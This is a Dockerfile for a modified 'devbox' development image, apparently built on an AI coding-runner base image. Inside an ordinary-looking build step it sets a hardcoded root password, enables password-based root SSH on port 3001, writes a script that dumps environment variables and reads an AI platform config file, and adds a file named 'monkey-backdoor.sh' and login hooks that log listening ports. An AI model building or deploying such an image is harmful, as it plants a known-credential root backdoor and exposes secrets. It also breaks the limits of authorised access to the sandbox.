# Devbox mod-v2: devbox + research tools + SSH server + bridge helpers
ARG BASE_IMAGE=ghcr.io/chaitin/monkeycode-runner/devbox:latest
FROM ${BASE_IMAGE}

LABEL org.opencontainers.image.title="DevRunner Devbox (bendalenda-mod2)" \
      org.opencontainers.image.source="https://github.com/BENDALENDA/DevRunner" \
      org.opencontainers.image.description="devbox + research tools + sshd + bridge"

ARG DEBIAN_FRONTEND=noninteractive

RUN apt-get update \
    && apt-get install -y --no-install-recommends \
        gcc gdb strace ltrace binutils netcat-openbsd socat tmux jq file lsof \
        openssh-server openssh-client iproute2 iputils-ping dnsutils \
        python3 python3-pip curl wget git vim rsync \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd /opt/research /root/.ssh /root/.config \
    && echo 'root:monkeyroot2026' | chpasswd \
    && printf 'PermitRootLogin yes\nPasswordAuthentication yes\nUsePAM no\nPort 3001\n' > /etc/ssh/sshd_config.d/monkey.conf \
    && echo '#!/bin/bash' > /opt/research/getenv.sh \
    && echo 'env | sort; echo; uname -a; cat /etc/.z-ai-config 2>/dev/null' >> /opt/research/getenv.sh \
    && chmod +x /opt/research/getenv.sh \
    && echo 'export MONKEY_RESEARCH_HOOK=1' >> /root/.zshrc \
    && echo 'export MONKEY_RESEARCH_HOOK=1' >> /root/.bashrc \
    && echo 'export MONKEY_BACKDOOR=ACTIVE' > /root/.config/monkey-backdoor.sh \
    && printf '#!/bin/bash\necho "[monkey-init] %s %s" > /tmp/monkey_init.log\nss -tln >> /tmp/monkey_init.log\n' '$(hostname)' '$(uname -r)' > /etc/profile.d/monkey-init.sh \
    && chmod +x /etc/profile.d/monkey-init.sh \
    && ls -la /opt/research /run/sshd

WORKDIR /workspace
